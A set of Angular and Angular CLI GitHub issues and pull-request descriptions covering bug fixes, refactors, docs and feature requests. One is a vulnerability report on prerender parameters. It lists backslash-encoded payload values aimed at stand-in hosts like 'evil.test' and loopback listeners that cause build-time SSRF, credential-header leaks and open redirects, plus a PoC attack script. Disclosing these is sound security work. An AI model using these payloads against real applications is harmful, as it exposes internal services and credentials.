Issues.Title: fix(core): add debugName option to toObservable
Issues.Body:
`toObservable()` watches the signal with an internal `effect`, which showed up unnamed in Angular DevTools, and `ToObservableOptions` had no way to name it. `toSignal()` and `effect()` already accept a `debugName`.

This is a follow-up to #71701, which adds the same option to `rxResource()`, so all the rxjs-interop helpers that create signals or effects can be named.

It adds a `debugName` option and names the effect like the internal signals of `toSignal()`:

```ts
readonly counter$ = toObservable(this.counter, {debugName: 'counter'});
// Angular DevTools: toObservable#counter.effect
```

### Question

`toSignal()` also names its signals when no `debugName` is passed (`toSignal.source`), so I did the same here: an unnamed `toObservable()` effect now shows up as `toObservable.effect` instead of an empty label.

- Is that the default you'd want, or should the effect only get a name when `debugName` is passed?
- Should I drop the `.effect` suffix? There's only one internal node, so `toObservable#counter` might read better.

Issues.Title: fix(forms): allow transformed constraint inputs without undefined in FormUiControl
Issues.Body:
## PR Checklist

- [x] The commit message follows our guidelines: https://github.com/angular/angular/blob/main/contributing-docs/commit-message-guidelines.md
- [x] Tests for the changes have been added (for bug fixes / features)
- [ ] Docs have been added / updated (for bug fixes / features)

## PR Type

- [x] Bugfix

## What is the current behavior?

`FormUiControl` types `min`/`max` as `InputSignal<NonNullable<TValue> | undefined> | InputSignalWithTransform<NonNullable<TValue> | undefined, unknown>` (and `minLength`/`maxLength` the same with `number`). The value type of an input signal is invariant, so a transformed input whose value type excludes `undefined` can't implement the interface:

```ts
class InputNumber implements FormValueControl<number | null> {
  readonly value = model<number | null>(null);
  readonly min = input(0, {transform: numberAttribute}); // TS2416
}
```

That input is sound. Its write type is `unknown`, so the transform already handles the `undefined` that `FormField` binds when a constraint is removed.

Issue Number: #71377

## What is the new behavior?

`min`, `max`, `minLength` and `maxLength` also accept an `InputSignalWithTransform` whose value type excludes `undefined`. Inputs without a transform still have to accept `undefined`, because the directive can bind it. No compiler change is needed: the template type-checker already checks these synthetic bindings against the input's write type.

Tests were added next to the existing `input transforms` cases in `form_field.spec.ts`. One also covers a reactive `min` constraint that is removed, so `undefined` reaches the transform. The public API golden is updated.

Fixes #71377

## Does this PR introduce a breaking change?

- [ ] Yes
- [x] No

## Other information

Running prettier on `control.ts` (required by `ng-dev format changed`) also reflows the existing `pattern` property onto one line.

Issues.Title: Retain Angular animations in v23 until coordinated enter/leave has a supported migration path
Issues.Body:
### Which @angular/* package(s) are relevant/related to the feature request? animations, core, platform-browser ### Description Please reconsider removing `@angular/animations` in v23 until there is a supported, behaviorally equivalent path for coordinated parent/child enter/leave animations, or a maintained compatibility package. I am asking sincerely as someone who wants to keep upgrading Angular, rather than freeze an application or maintain a private framework fork. Simple CSS fades are not the difficulty. The value for my application is Angular coordinating view lifetime, child queries, forward/reverse stagger, delayed entry and changing state through one reusable declaration. **Our actual setup** is a standalone, zoneless Angular media-editor application (currently testing Angular 22.1.8). A parent wizard reacts to its step signal and coordinates a child trigger inside each `@switch` branch: ```html
@switch (step()) { @case ('first') {

First step

} @case ('second') {

Second step

} }
``` The names/content above are shortened for this report. The animation structure and these timings come from our working shared triggers: ```ts const fadeItems = trigger('fadeItems', [ transition('* => *', [ query('@fadeItemsParent', animateChild(), { optional: true }), ]), ]); const fadeItemsParent = trigger('fadeItemsParent', [ transition(':enter', [ query('.fade-item', [ style({ opacity: 0 }), stagger(100, animate('250ms 469ms ease-in', style({ opacity: 1 }))), ], { optional: true }), ]), transition(':leave', [ query('.fade-item', [ stagger(-100, animate('250ms ease-out', style({ opacity: 0 }))), ], { optional: true }), ]), ]); ``` The real wizard uses overlapping/positioned step containers, so outgoing controls can finish fading while incoming controls appear after the entry delay. Callers mark their controls with `.fade-item`; they do not each manage animation parameters or lifecycle callbacks. Another current caller retains both form views and switches `HIDDEN`/`VISIBLE` states with the same shared trigger, preserving entered form data instead of destroying it. We also have an ordered variant for numbered child groups. **Evidence from our migration attempts:** I went back through the actual development records rather than relying on memory. - On 7 December 2025, we attempted a broad replacement with CSS/JavaScript/Web Animations, including a shared animation runner, structural enter/leave directive and fade-list directive, across the wizard, upload widgets, layout and video page. - The first result was only partly functional: I reported, “the fade out animation doesnt happen, it exits instantly.” The implementation had replaced parent-managed animations with enter-only list behavior, allowing outgoing DOM to disappear before the exit completed. - A subsequent pass replaced those list usages with a structural directive intended to retain the outgoing view. I still reported that the fade-out did not happen. - A further correction had to stop updating the old view's binding context before fading it out, then swap in a new view and enter it. This is the kind of subtle view-lifecycle/state bookkeeping the existing animation engine was already handling for us. These are documented unsuccessful attempts, not a claim that CSS/WAAPI is mathematically incapable of the effect. They also predate improvements since then; I am not presenting them as a newly verified bug in Angular 22's native APIs. My concern is losing supported orchestration and being required to rebuild it as application infrastructure, with recurring edge cases and a different call-site API. ### Proposed solution Please either: 1. Keep the legacy engine available and supported through v23 while advanced migration cases are resolved; or 2. Provide an officially supported compatibility package/adapter preserving the trigger API and its integration; or 3. Publish a complete, tested equivalent for the coordinated example above before removal, including nested controls, old/new view-context separation, reverse stagger, rapid step reversal, and retained forms whose visibility changes without destruction. A parity example should show the same old and new behavior, rather than a simpler single-element fade. If there is already a supported solution that preserves this setup without a large custom runner or per-caller rewrites, I would genuinely welcome being pointed to it. I would much rather adopt that than argue against progress. Please do not remove a working capability before applications with this orchestration pattern have a dependable migration path. A longer deprecation period or a maintained compatibility package would make a real difference. ### Alternatives considered - `animate.enter`/`animate.leave` plus CSS: valuable for basic effects, but our attempted replacement lost parent/child and view-lifetime coordination. A current, complete parity example is the missing piece for this case. - A custom WAAPI runner and structural wrappers: attempted, but introduced context-swap/lifecycle bugs and substantial application-owned machinery. - Pinning Angular 22: a temporary option, not a sustainable upgrade strategy. - Carrying the old package forward with dependency overrides or a private fork: this does not itself preserve removed renderer/compiler integration and transfers maintenance to application developers. Related: the completed [animation RFC](https://github.com/angular/angular/discussions/62212) and [#66359](https://github.com/angular/angular/issues/66359), where a contributor also expected one-to-one migration examples. I recognize that #66359 was a resolved documentation discussion; I am linking it for context, not claiming it remains an open bug.

Issues.Title: fix(compiler-cli): surface preprocessor wasm engine errors as Error instances
Issues.Body:
The wasm engine's fallible exports (`analyze*`, `updateFileContent`, `invalidateFiles`, `setEntryPoints`, `getFileContent`) return `Result<_, String>`, which wasm-bindgen throws across the boundary as a bare string. `WasmAnalyzer` forwarded those unchanged, so a failed call rejected with a string on the wasm backend but with an `Error` on the N-API backend (`napi::Error`) and the sidecar backend (`new Error(payload)`). Consumers of `IAnalyzer` that inspect `error.message`, `instanceof Error` or `.stack` — and test matchers such as `toBeRejectedWithError` — therefore behaved differently depending on which engine happened to load.

Route every engine call in `WasmAnalyzer` through a single `invoke` helper that keeps the existing "older engine build lacks this export" error and wraps anything else thrown in an `Error`. `Error` instances pass through unchanged so wasm-bindgen's own `TypeError`s (e.g. a call after `free()`) and Rust panics (`RuntimeError`) keep their type and stack. This lives in the adapter rather than in the Rust bindings so that it also covers already-built engines, in line with the adapter's existing tolerance for older exports.

The no-tsconfig spec goes back to `toBeRejectedWithError` for the relative entry point rejection, exercising the normalization through the real binding; `analyzer_wasm_spec.ts` covers each method against a fake engine.

Issues.Title: refactor(compiler-cli): decouple preprocessor syntax extraction from resource and module resolution
Issues.Body:
Previously, `QueryEngine::analyze_file_syntax_body` held the `ParsedFile` mutex guard across the entire single-file syntax pass, including `@angular/core` package detection, external component template and stylesheet loading via `ResourceResolver`, and static and dynamic import specifier resolution. Because `std::sync::MutexGuard<ParsedFile>` cannot be held across `.await` points, coupling AST traversal to synchronous filesystem reads and module resolution prevented replacing direct resolver and filesystem access with an asynchronous bundler host protocol.

Make `analyze_parsed`, `ClassVisitor`, and `component::parse_decorator` pure syntactic and semantic passes with no `ResourceResolverFs` type parameter, filesystem reference, or module resolver. During `@Component` decorator parsing, record raw `templateUrl` and `styleUrl`/`styleUrls` expressions on `pending_template_url` and `pending_style_urls` without touching the filesystem. In `analyze_file_syntax_body`, compute `detect_is_core` prior to acquiring the `ParsedFile` lock, and release the mutex guard immediately after `analyze_dts` or `analyze_parsed` completes. Run a dedicated `load_syntax_resources` pass outside the lock to resolve and read Stage 1 component resources while retaining cross-file expressions for Stage 2 evaluation, preserving existing behavior.

Issues.Title: test(compiler-cli): expand preprocessor no-tsconfig test coverage
Issues.Body:
The options-only form of `createAnalyzer` (no `tsconfigPath`) was only exercised end-to-end for a single standalone component. The behaviors that actually depend on the root list and on options that would otherwise come from the tsconfig — NgModule scope resolution, root replacement via `setEntryPoints`, the `r3SymbolsFile` override and `PrefixImportStrategy` — were covered by Rust unit tests alone, not through the public API and the wasm transport that hosts without a tsconfig use.

Add WASM end-to-end test cases for running the preprocessor without a `tsconfig.json`:

- Resolving `NgModule` compilation scopes across the import closure of a single entry point.
- Evicting cached `NgModule` scopes when `setEntryPoints()` adds or removes compilation roots (and rejecting relative paths).
- Rewriting `@angular/core` runtime imports when `r3SymbolsFile` is supplied explicitly without `r3_symbols.ts` in `entryPoints`.
- Emitting workspace-prefixed imports using `importPrefixRoots` and `workspaceName`.

The relative-path rejection is asserted on the message rather than with `toBeRejectedWithError`: the wasm-bindgen binding returns `Result<_, String>`, so the engine's error reaches JavaScript as a bare string instead of an `Error`, unlike the N-API and sidecar adapters.

Issues.Title: fix(common): allow mixed pixel and responsive values in NgOptimizedImage sizes
Issues.Body:
`NgOptimizedImage` rejects `sizes` values that mix responsive declarations with a pixel fallback, such as `sizes="(max-width: 540px) 100vw, 370px"`, even though they produce a correct automatic `srcset`. The `assertNoComplexSizes` check only needs to catch purely pixel-based values (e.g. `sizes="500px"`), which would switch `srcset` generation into responsive mode and select oversized images.

The check now errors only when `sizes` contains pixel values without any responsive value, and also catches pixel values with leading whitespace, which the previous regex missed.

Issues.Title: refactor(compiler-cli): move language service helpers out of the preprocessor core
Issues.Body:
`src/comments.ts` and `src/tcb_ls_util.ts` are only used by the preprocessor language service (and the VS Code extension server built on it), but they live in `src/`, so the `preprocessor` target's `src/**` glob ships them with the core compiler. They are also the only two files in that target that import `typescript` directly: the compiler itself never touches it, and the analyzer reads the tsconfig in Rust. Moving them into `language-service/src/` leaves the core sources free of direct TypeScript imports and keeps the helpers next to their consumers.

Neither file is part of the public API: `api.ts` does not re-export them and the package's `exports` map only exposes `api.js`. Their own imports are unchanged apart from the re-export of the position helpers from `src/tcb_util.ts`, which stays in the core as it is also used by the processor. No BUILD changes are needed, as the `language-service` target already globs `src/**` and depends on `typescript`, and its tests and the extension server already depend on it.

Issues.Title: refactor(compiler-cli): write the preprocessor `.ngdiag.json` once per run
Issues.Body:
`run` wrote `<tsconfig>.ngdiag.json` after every analysis chunk and then once more after the loop. The per-chunk write dates from the initial import and never had a consumer: nothing reads the file while `ngp` is running, and build integrations only read it after a successful exit. The trailing write was added later so that option diagnostics still reach the file when the analyzer produces no chunks, which left N + 1 writes whose last two are byte-identical, each re-sorting and re-serializing every diagnostic collected so far. The in-place overwrite is also not atomic, so the extra writes only gave a concurrent reader more chances to observe a truncated file. A single unconditional write after the loop produces the same final file in every case, including the zero-chunk one.

Also close the wasm analyzers created by the first two tests in `create_analyzer_without_tsconfig_spec.ts`; each leaked its wasm instance for the rest of the test process.

Issues.Title: docs: document deploying localized apps with prerendering
Issues.Body:
The i18n deploy guide only covers `outputMode: "server"` plus the nginx and Apache examples, so prerendered localized apps (`outputMode: "static"`) had nothing. I ended up building one and reading `dist/` to figure out what to do.

Adds a "Prerendering" section to `deploy.md`:

- each locale gets its own folder under `browser/`, with its own `lang`, `<base href>` and `public/` copy
- `sourceLocale: {code, subPath: ""}` keeps the source locale at `/` and the rest under `/tr/`, `/es/`
- no server means no `Accept-Language` redirect, so the host does it. The nginx and Apache examples assume every locale is in a subdir, so they need adapting
- you only get a per-locale not-found page if the app has a prerendered `404` route. A lone `**` route doesn't produce one

Also adds a short section to `locale-id.md` on reading `$localize.locale` when you can't inject `LOCALE_ID`.

Issues.Title: fix(docs-infra): keep focus in the API reference filter
Issues.Body:
angular.dev is built from 22.2.x, where the API reference filter still loses focus after the first key: typing `signal` leaves `s`, and focus ends up on the `<body>`. The fix on main (#71602) uses the router's `focusReset` option from #71595, which is a feature and stays on main, so #71602 was reverted here in #71667.

This version doesn't add any public API. The first commit makes the Navigation API integration read `focusReset` from the navigation extras and pass it to `intercept()`, at the same place as on main, but the option isn't added to `NavigationBehaviorOptions`, so the router API golden doesn't change. I left out the guard redirect part of #71595, the filter doesn't need it. The second commit is #71602 with a cast to `NavigationExtras`, since the option isn't in the types here.

Both commits are only for 22.2.x. Main already has the public option and the same adev change without the cast.

`//packages/router/test:test`, `//packages/router/test:test_web_chromium`, `//packages/router:router_api` and `//adev:test` pass on this branch.

Issues.Title: refactor(compiler-cli): initial implementation of incremental compilation in preprocessor
Issues.Body:
Adds an initial implementation for incremental compilation in the preprocessor. Some numbers from a benchmark running against a synthetic app made up of  20 features x 20 components + 30 shared directives/pipes/services (~500 TS files, ~400 templates):

| scenario | main | branch | delta | files processed (main -> branch) | files written (main -> branch) | 
|---|---|---|---|---|---|
| cold build (fresh analyzer) | 3388 ms | **3366 ms** | −0.7% | 513 -> 513 | 513 -> 513 | 
| rebuild: template edit (leaf component) | 3143 ms | **41 ms** | −98.7% | 513 -> 1 | 513 -> 1 | 
| rebuild: component method body | 3144 ms | **40 ms** | −98.7% | 513 -> 1 | 513 -> 2 | 
| rebuild: service method body (widely imported) | 3150 ms | **34 ms** | −98.9% | 513 -> 1 | 513 -> 8 | 
| rebuild: directive public API (new input) | 3167 ms | **169 ms** | −94.6% | 513 -> 10 | 513 -> 8 | 
| rebuild: NgModule scope (drop an export) | 3210 ms | **49 ms** | −98.5% | 513 -> 1 | 513 -> 2 |

**Note:** the real-world numbers will depend on build tooling integration so take these numbers with a grain of salt.

Issues.Title: @angular/ssr: an aborted request rejects `handle()` but the render keeps running
Issues.Body:
### Which @angular/* package(s) are the source of the bug?

platform-server

### Is this a regression?

No

### Description

`AngularServerApp.handle()` wraps `handleRendering()` in `promiseWithAbort(…, request.signal, …)` (`packages/angular/ssr/src/app.ts`). When the signal aborts, the returned promise rejects, but nothing stops the render: the platform `renderAngular()` created stays alive, its HTTP calls keep going, and the app goes on rendering a page nobody will receive.

This makes `request.signal` unusable as a render timeout. A server that caps renders (to answer 503 before the proxy's own timeout, and to limit how many renders run at once) gets its promise back on time while the work piles up in the background. With a slow backend, every abandoned render is still running when the next batch starts.

Reproduction: a route whose component issues an `HttpClient` GET to a backend that answers after 60 s. Call `engine.handle(new Request(url, { signal: AbortSignal.timeout(5_000) }))`. `handle()` rejects at 5 s; the backend still sees the request run to completion, and any request the app makes after that response still arrives. On our app (22.2.2), three renders aborted at 50 s made 8 more backend calls once the backend answered.

**Suggested fix**

Pass the signal into `renderAngular()` and destroy the platform on abort, the same way it is destroyed after a normal render:

```ts
// utils/ng.ts, inside renderAngular(), after platformServer(...)
const onAbort = () => void asyncDestroyPlatform(platformRef);
signal?.addEventListener('abort', onAbort, { once: true });
// ...and remove the listener in the existing finally / destroy paths
```

The rest already works: destroying the app clears `PendingTasks`, so `whenStable()` settles; the `applicationRef.destroyed` check added in 730ae66 ("handle platform destruction during rendering") returns `{ hasNavigationError: true }`; and `FetchBackend` aborts its fetch when the destroyed app's subscriptions are torn down.

**Workaround** (what we ship now), in `app.config.server.ts`:

```ts
provideEnvironmentInitializer(() => {
  const signal = inject(REQUEST, { optional: true })?.signal;
  if (!signal) return;
  const platform = inject(PlatformRef);
  const destroy = () => setTimeout(() => platform.destroyed || platform.destroy());
  if (signal.aborted) return destroy();
  signal.addEventListener('abort', destroy, { once: true });
  inject(DestroyRef).onDestroy(() => signal.removeEventListener('abort', destroy));
});
```

Issues.Title: fix(@angular/ssr): destroy platform when request is aborted during rendering
Issues.Body:
Previously, aborting `request.signal` during server-side rendering caused `AngularServerApp.handle()` to reject via `promiseWithAbort`, while `renderAngular()` continued running in the background until `whenStable()` completed (or leaked the platform if a pending task never resolved).

This commit forwards `request.signal` into `renderAngular()` so that aborting an in-flight request destroys the underlying `PlatformRef`, cancels any pending render timer, and exits cleanly. Additionally, `promiseWithAbort()` now attaches rejection handlers to the underlying promise even when the signal is already aborted to avoid unhandled promise rejections.

Closes #34567

Issues.Title: Debug ID changes the bytes of an optimized chunk but not its file name, so cached files fail the SRI check
Issues.Body:
### Command

build

### Is this a regression?

- [x] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

22.0.x

### Description

Since 22.1.0 (#33110), the application builder adds a `//# debugId=<uuid>` line to each browser JS file when script source maps are enabled. The ID comes from the bytes of the source map.

When the chunk optimizer runs (by default when the build has 3 or more lazy chunks), Rolldown gives the chunks their final file names. The `[hash]` in these names covers the code of the chunk only. It does not cover the source map. The debugId line is added after that.

A change that keeps the JS code of a chunk the same but changes its source map (for example, a change to a TypeScript type or to a comment) gives this result for a chunk that does not import other chunks:

1. The file name stays the same.
2. The debugId changes, because the source map changed.
3. The file bytes change, because the debugId line changed.
4. The SRI hash in `index.html` changes to match the new bytes.

In one build, the HTML and the files match. Across two builds, the rule "same hashed file name means same content" is no longer true.

Hosting setups depend on this rule: they cache hashed files as immutable. Any cache can keep the file from the previous build: a CDN such as Cloudflare, the browser cache, or a proxy. That cache then serves the old bytes together with the new `index.html`. The integrity check fails, the browser blocks the file, and the modules in it do not load.

Before 22.1.0 there was no debugId line, so the bytes of a hashed file changed only when its name changed.

**Expected behavior:** if the bytes of a hashed output file change, its file name changes too.

### Minimal Reproduction

Repository: https://github.com/virgiliojr/angular-debugid-sri-repro

The app is a plain `ng new` app (Angular CLI 22.2.2) with 3 lazy routes, so the chunk optimizer runs. `lazy-a` and `lazy-b` use `src/app/shared/label.ts`. This module has no imports, so it becomes its own chunk.

1. Run `npm ci`.
2. Run `npx ng build --source-map --subresource-integrity`.
3. In `dist/repro/browser/`, find the chunk that contains `label:`. Write down its file name and its SHA-384.
4. In `src/app/shared/label.ts`, add `extra?: number;` to the `LabelInput` interface. This is a type-only change: the JS output of `label.ts` stays the same.
5. Run `npx ng build --source-map --subresource-integrity` again.
6. Find the chunk that contains `label:` again.

`bash compare-builds.sh` in the repository does steps 2 to 6 and prints the result below.

**Actual result:**

```text
Build 1
  file name:          chunk-z-ytF2G0.js
  sha384 of bytes:    sha384-Y7f5K4V0FTCrXc6JQ2tGE+VllRWg501EixeFEPMjNMboDgwfeRc9E6l8oHlqTbX5
  debugId line:       //# debugId=105cedd6-2603-584f-8e8d-7801d6020b96
  sha in index.html:  yes
Build 2
  file name:          chunk-z-ytF2G0.js
  sha384 of bytes:    sha384-bgCbCJmJexbhKCHeS4kpofe2lKBPWJ1f3JpK9668+/jD2mfiEYADUy5xD1Usr1dZ
  debugId line:       //# debugId=9c547775-c029-5af8-ba7e-25c70949f1b6
  sha in index.html:  yes

Diff of the chunk between the two builds:
2c2
< //# debugId=105cedd6-2603-584f-8e8d-7801d6020b96
---
> //# debugId=9c547775-c029-5af8-ba7e-25c70949f1b6
```

The file name is the same, but the bytes and the SRI hash in `index.html` are different.

**Expected result:** if the bytes are different, the file name is different too.

To see the failure in a browser, serve the output of build 2, but serve `chunk-z-ytF2G0.js` from build 1. This is what a cache does after a deployment.

### Exception or Error

```text
Failed to find a valid digest in the 'integrity' attribute for resource 'https://<host>/chunk-z-ytF2G0.js' with computed SHA-384 integrity '<hash>'. The resource has been blocked.
```

### Your Environment

```text
Angular CLI       : 22.2.5
Angular           : 22.2.3
Node.js           : 24.18.0
Package Manager   : npm 11.16.0
Operating System  : darwin arm64

┌───────────────────────────┬───────────────────┬───────────────────┐
│ Package                   │ Installed Version │ Requested Version │
├───────────────────────────┼───────────────────┼───────────────────┤
│ @angular/build            │ 22.2.5            │ ^22.2.2           │
│ @angular/cli              │ 22.2.5            │ ^22.2.2           │
│ @angular/common           │ 22.2.3            │ ^22.2.0           │
│ @angular/compiler         │ 22.2.3            │ ^22.2.0           │
│ @angular/compiler-cli     │ 22.2.3            │ ^22.2.0           │
│ @angular/core             │ 22.2.3            │ ^22.2.0           │
│ @angular/forms            │ 22.2.3            │ ^22.2.0           │
│ @angular/platform-browser │ 22.2.3            │ ^22.2.0           │
│ @angular/router           │ 22.2.3            │ ^22.2.0           │
│ rxjs                      │ 7.8.2             │ ~7.8.0            │
│ typescript                │ 6.0.3             │ ~6.0.2            │
└───────────────────────────┴───────────────────┴───────────────────┘
```

### Anything else relevant?

This does not depend on the browser. Any cache in front of the hashed files can cause it.

The defect needs the chunk optimizer. With `NG_BUILD_OPTIMIZE_CHUNKS=false`, the same type change gives a new esbuild file name for the chunk (for example `chunk-P54LQIKA.js` to `chunk-5HS55H7R.js`), so the name and the bytes change together.

A chunk that imports other chunks usually gets a new name anyway, because the names of the chunks it imports change. A chunk without such imports keeps its name.

Related: #33108, #33110, #33572. The current `main` still has this behavior: `injectDebugIds` (called from `execute-post-bundle.ts` when `sourcemapOptions.scripts` is true) changes the file contents but does not change the file name. The Rolldown pass in `chunk-optimizer.ts` uses `chunkFileNames: '<name>-[hash].js'`.

Issues.Title: fix(@schematics/angular): update the PostCSS configuration used by the build in tailwind
Issues.Body:
The tailwind schematic searched the workspace root before the project root and `.postcssrc.json` before `postcss.config.json`, the opposite of the build system. Issues.Title: Angular SSR prerender params allow build-time SSRF, credential leaks, and open redirects
Issues.Body:
### Command

other

### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

_No response_

### Description


This is the part of #34474 that escaping doesn't reach. 22.2.5 ships both fixes from that issue, and a `getPrerenderParams()` value that starts with `\` still leaves the application's origin twice: while `ng build` renders the page, and in the redirect it ships.

`handlePrerenderParamsReplacement` only checks the type ([`ng-routes.ts#L553-L570`](https://github.com/angular/angular-cli/blob/v22.2.5/packages/angular/ssr/src/routes/ng-routes.ts#L553-L570)):

```ts
if (typeof value !== 'string') {
  throw new Error(/* ... */);
}

return parameterName === '**' ? `/${value}` : value;
```

So `\cdn-login.test` becomes the route `/\cdn-login.test`. As a path it looks harmless, but for `http:` the URL parser reads `\` as `/`, so the route is `//cdn-login.test`, another host. Two places use the route as a URL:

- `renderPage` builds the render request with `new Request(new URL(url, serverURL))` ([`render-worker.ts#L54`](https://github.com/angular/angular-cli/blob/v22.2.5/packages/angular/build/src/utils/server-rendering/render-worker.ts#L54)), so the page renders with that host as its origin, and every relative `HttpClient` call made during the render goes there.
- The resolved `redirectTo` goes into the generated redirect page ([`prerender.ts#L258`](https://github.com/angular/angular-cli/blob/v22.2.5/packages/angular/build/src/utils/server-rendering/prerender.ts#L258)), or into `Location` with `outputMode: 'server'`.

Those values are application data, the docs read them from a service:

```ts
const ids = await dataService.getIds();
return ids.map((id) => ({ id }));
```

So whoever can write one row, through a public signup or as a CMS author, picks where the build connects and where visitors land. The product in the repro validates both inputs (no whitespace, no raw `\`, no `..`) and these still pass, because `RouteTree.getPathSegments` percent-decodes each segment afterwards ([`route-tree.ts#L212-L213`](https://github.com/angular/angular-cli/blob/v22.2.5/packages/angular/ssr/src/routes/route-tree.ts#L212-L213)). One value is enough:

| Value                               | Entered through               | Result                                                                                   |
| ----------------------------------- | ----------------------------- | ---------------------------------------------------------------------------------------- |
| `\cdn-login.test`                   | workspace slug, public signup | `/%5Ccdn-login.test` redirects to `cdn-login.test`                                       |
| `%5C127.0.0.2/docs/getting-started` | CMS page path                 | the build reads an internal-only service and publishes the response                      |
| `%5C127.0.0.1:8787/%2E%2E`          | CMS page path                 | the platform credentials go to `127.0.0.1:8787`, and the site's `index.html` is replaced |
| `%5Cevil.test/docs/getting-started` | CMS page path                 | the build sends a request to `evil.test`                                                 |

`ng build` exits 0 with no warning for all of them.

**1. Open redirect.** Each workspace gets a vanity URL that lands on its home page:

```ts
{ path: ':workspace', children: [
  { path: '', pathMatch: 'full', redirectTo: 'home' },
  { path: 'home', component: WorkspacePage },
]},
```

With the slug `\cdn-login.test` the build writes this redirect page:

```html
<meta http-equiv="refresh" content="0; url=/\cdn-login.test/home" />
```

In Chrome, `http://status.statuslane.test/%5Ccdn-login.test` ends on `http://cdn-login.test/home`. The link has no `@`, no second scheme and no `//`. `escapeHtml` leaves the target as it is, since there's nothing in it to escape.

**2. Reading an internal service.** Docs pages load their body in a resolver, over a relative URL:

```ts
inject(HttpClient).get(`/api/content/${path}`, { responseType: 'text' });
```

With the page path `%5C127.0.0.2/docs/getting-started` the page renders at `http://127.0.0.2`, so the build fetches `http://127.0.0.2/api/content/docs/getting-started`, a service only the CI network can reach. Its response, database URL included, is written into the published page and into `ng-state`. The attacker never needs an inbound connection, the response comes back through the site. The tail has to name a route that exists, otherwise the build fails with `The content returned was empty.`

**3. Credentials to another host.** The home page calls the internal API or/and an interceptor adds the platform token only to relative URLs, which is the usual guard:

```ts
if (!req.url.startsWith('/api/internal/')) {
  return next(req);
}
return next(
  req.clone({
    setHeaders: { authorization, 'x-api-key': apiKey, cookie, 'x-ci-deploy-token': ciToken },
  }),
);
```

With `%5C127.0.0.1:8787/%2E%2E` the URL is still relative when the interceptor runs and the origin is applied later, so all four headers arrive at `127.0.0.1:8787`. `%2E%2E` consumes the host segment when `posix.join` computes the output path ([`prerender.ts#L462`](https://github.com/angular/angular-cli/blob/v22.2.5/packages/angular/build/src/utils/server-rendering/prerender.ts#L462)), so the page is written over the site's own `index.html` and `dist` has no odd file name. That write races the real home page: 1 of 3 builds at 0 ms, 3 of 3 when the listener answers after 1500 ms. The credentials go out every time.

**4. `allowedHosts` isn't consulted.** The app sets `security.allowedHosts: ["localhost"]`, none of the hosts above is on it, and the build went to all of them. A DNS name works the same. With the page path `%5Cevil.test/docs/getting-started` the page renders at `http://evil.test`, and its request only fails because `.test` doesn't resolve:

```text
evil.test/docs/getting-started/index.html
    origin   http://evil.test
    content  "unavailable (Http failure response for http://evil.test/api/c)"
```

A name the attacker owns would connect. The page gets that origin even though nothing answered, because the origin is set before any request is made. `allowedHosts` only decides which `Host` headers the running server answers. A filter on the raw value doesn't help either, since `%5C` is decoded later.

### Minimal Reproduction


Repository: https://github.com/SkyZeroZx/angular-cli-prerender-param-ssrf-poc

There the values arrive over HTTP from the application's own API, through a public signup and a CMS author token. Every host is on loopback.

```bash
npm ci
npm run attack
npm run browser
```

```text
build              exit 0, prerendered 12, warnings 0
allowedHosts       ["localhost"] (angular.json)
  P1 signup "\cdn-login.test"                          accepted                     landed
  P2 cms    "%5C127.0.0.2/docs/getting-started"        accepted                     landed
  P3 cms    "%5C127.0.0.1:8787/%2E%2E"                 accepted                     landed
  P4 cms    "%5Cevil.test/docs/getting-started"        accepted                     landed
  [attacker] GET /api/internal/metrics  Host=127.0.0.1:8787  UA=node  (not in allowedHosts)
  [internal] GET /api/content/docs/getting-started  Host=127.0.0.2  UA=node  (not in allowedHosts)
```

Without the lab, one route and one value:

```ts
// app.routes.ts
export const routes: Routes = [
  {
    path: ':tenant',
    children: [
      { path: '', redirectTo: 'home', pathMatch: 'full' },
      { path: 'home', component: Page },
    ],
  },
  { path: '**', component: Page },
];

// app.routes.server.ts
export const serverRoutes: ServerRoute[] = [
  {
    path: ':tenant',
    renderMode: RenderMode.Prerender,
    getPrerenderParams: async () => [{ tenant: '\\evil.test' }],
  },
  { path: '**', renderMode: RenderMode.Client },
];
```

```bash
ng build
NG_ALLOWED_HOSTS=localhost PORT=4000 node dist/<app>/server/server.mjs &
curl -s -o /dev/null -D - http://localhost:4000/%5Cevil.test | grep -i location
```

```text
location: /\evil.test/home
```

With `--output-mode=static` the same value writes a redirect page with the same target.

@angular/build 22.2.5
@angular/ssr 22.2.5
@angular/core 22.2.3
Node.js 24.16.0
npm 11.13.0

Issues.Title: fix(@schematics/angular): do not drop callThrough() on existing spies in refactor-jasmine-vitest
Issues.Body:
## PR Checklist

- [x] The commit message follows our guidelines: https://github.com/angular/angular-cli/blob/main/CONTRIBUTING.md#-commit-message-guidelines
- [x] Tests for the changes have been added (for bug fixes / features)
- [ ] Docs have been added / updated (for bug fixes / features)

## PR Type

- [x] Bugfix
- [ ] Feature
- [ ] Code style update (formatting, local variables)
- [ ] Refactoring (no functional changes, no api changes)
- [ ] Build related changes
- [ ] CI related changes
- [ ] Documentation content changes
- [ ] Other... Please describe:

## What is the current behavior?

Issue Number: N/A

`refactor-jasmine-vitest` drops `.and.callThrough()` on spy that already exists and leaves just `spy;`
Before #33266 that mostly worked since `vi.spyOn` calls through anyway, now bare `spyOn` becomes `vi.spyOn(...).mockReturnValue(undefined)` and spy stays stub after migration, without any TODO

```ts
beforeEach(() => {
  api = new Api();
  spy = spyOn(api, 'get');
});

it('calls the real method after callThrough()', () => {
  spy.and.callThrough();
  expect(api.get(1)).toBe('1');
  expect(spy).toHaveBeenCalledWith(1);
});
```

Passes on Jasmine, after migration `ng test` fails with `AssertionError: expected undefined to be '1'` and nothing points to dropped line
Spy that got `.and.returnValue('x')` first keeps returning `'x'` same way

## What is the new behavior?

When `.and.callThrough()` is called on existing spy (`spy`, `getSpy()`), it is kept as is with TODO, so converted spec fails right on that line until it is migrated
Vitest has no exact equivalent there, `mockReset()` brings original implementation back but also clears recorded calls, so TODO sugests it and says that
Chain right on spy creation (`spyOn(...).and.callThrough()`, same for `spyOnProperty` and `jasmine.createSpy`) is removed like before, also when call is wrapped in parens or type assertion

New spec cases for existing spy fail on main (get `mySpy;` and `getSpy();`), wrapped `spyOn` case passes on main and guards new check

## Does this PR introduce a breaking change?

- [ ] Yes
- [x] No

## Other information

I went with TODO since rewrite is not 1:1. If you prefer, it can emit `spy.mockReset()` directly with "verify" TODO, like `arrayWithExactContents-check` does
That makes example above pass right after migration, but test that counts calls made before `callThrough()` fails with `expected "get" to be called 2 times, but got 1 times`

Issues.Title: fix(@schematics/angular): migrate `serviceWorker: true` to a config path in use-application-builder
Issues.Body:
